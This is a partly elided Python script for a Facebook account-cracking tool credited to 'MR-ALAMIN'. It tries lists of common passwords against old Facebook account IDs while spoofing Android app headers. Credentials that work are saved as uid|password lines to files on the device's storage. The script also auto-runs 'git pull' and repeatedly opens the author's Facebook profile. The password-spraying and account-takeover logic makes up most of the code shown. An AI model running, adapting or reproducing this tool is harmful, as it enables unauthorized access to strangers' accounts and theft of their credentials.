...
os.system("git pull");os.system("xdg-open https://www.facebook.com/profile.php?id=61551881526860&mibextid=ZbWKwL/");time.sleep(2);os.system("clear")
#▬▭▬▭▬▭▬▭[MODULE]▬▭▬▭▬▭▬▭#
try:import pystyle
...
║ ║║  ║║  ║ ║║  ║  ║  ║ ║║║║║╣ 
╚═╝╩═╝╩╝  ╩ ╩╝  ╚═╝╩═╝╚═╝╝╚╝╚═╝"""" MR-ALAMIN"))
info=(f"""{style}{green} FACEBOOK {white}➤ {green}ALAMIN HOSSEN
{style}{green} STATUS   {white}➤ {green}{version}
{style}{green} GITHUB   {white}➤ {green}github.com/blackcyber143""")
def main_logo():
...
def main():
    ...
    print(f'{white}[{red}C{white}]{green} FOLLOW MY FACEBOOK ID')
    print(f'{white}[{red}O{white}]{green} EXIT THIS PROGRAM')
    linex()
    year_select = input(f'{white}[{red}?{white}] {green}SELECT {white}▶︎ {green}')
    if year_select in ['A','a','01','1']:os.system("xdg-open https://www.facebook.com/profile.php?id=61551881526860&mibextid=ZbWKwL");old_2011_2014()
    elif year_select in ['B','b','02','2']:os.system("xdg-open https://www.facebook.com/profile.php?id=61551881526860&mibextid=ZbWKwL/");old_2009_2010()
    elif year_select in ['c','C','03','3']:os.system("xdg-open https://www.facebook.com/profile.php?id=61551881526860&mibextid=ZbWKwL/");main()
    elif year_select in ['6','f','06','F']:os.system("xdg-open https://www.facebook.com/profile.php?id=61551881526860&mibextid=ZbWKwL/");old_2008()
    elif year_select in ['O','o','00','0']:os.system("xdg-open https://www.facebook.com/profile.php?id=61551881526860&mibextid=ZbWKwL");os.system("exit")
    else:main()
#▬▭▬▭▬▭▬▭[OLD MENU]▬▭▬▭▬▭▬▭#
def old_2011_2014():
    user=[]
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            ...
            if "session_key" in mtd_A:
                ...
                open("/sdcard/MR-ALAMIN-OLD-M1--OK.txt","a").write(uid+"|"+pw+"\n")
                break 
            elif "Please Confirm Email" in str(mtd_A):
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/MR-ALAMIN-OLD-M1-OKK.txt","a").write(uid+"|"+pw+"\n")
                break
            else:continue
        loop+=1
...
def _method_B_(uid,user):
    ...
    ua="'Davik/2.1.0 (Linux; U; Android 12.0.0; PRA-LX1 Build/OPM8.377837.605) [FBAN/FB4A;FBAV/128.0.0.36150;FBBV/984874910;FBDM/{density=3.0,width=1080,height=1794};FBLC/en_US;FBRV/984874910;FBCR/AT&amp;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.adsmanager;FBDV/PRA-LX1;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Net-HNI': '12602', 'X-FB-SIM-HNI': '52644', 'X-FB-Connection-Type': 'Mobile.LTE', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '851'"
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123",'bangladesh','mimmim','sabbir','i love you','Bangladesh','@@@###','jannat','bangla','506070']:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            ...
            if "session_key" in mtd_B:
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/MR-ALAMIN-OLD-M2-OK.txt","a").write(uid+"|"+pw+"\n")
                break 
            elif "Please Confirm Email" in str(mtd_B):
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/MR-ALAMIN-OLD-M2-OKK.txt","a").write(uid+"|"+pw+"\n")
                break
            else:continue
        loop+=1
    except Exception as e:
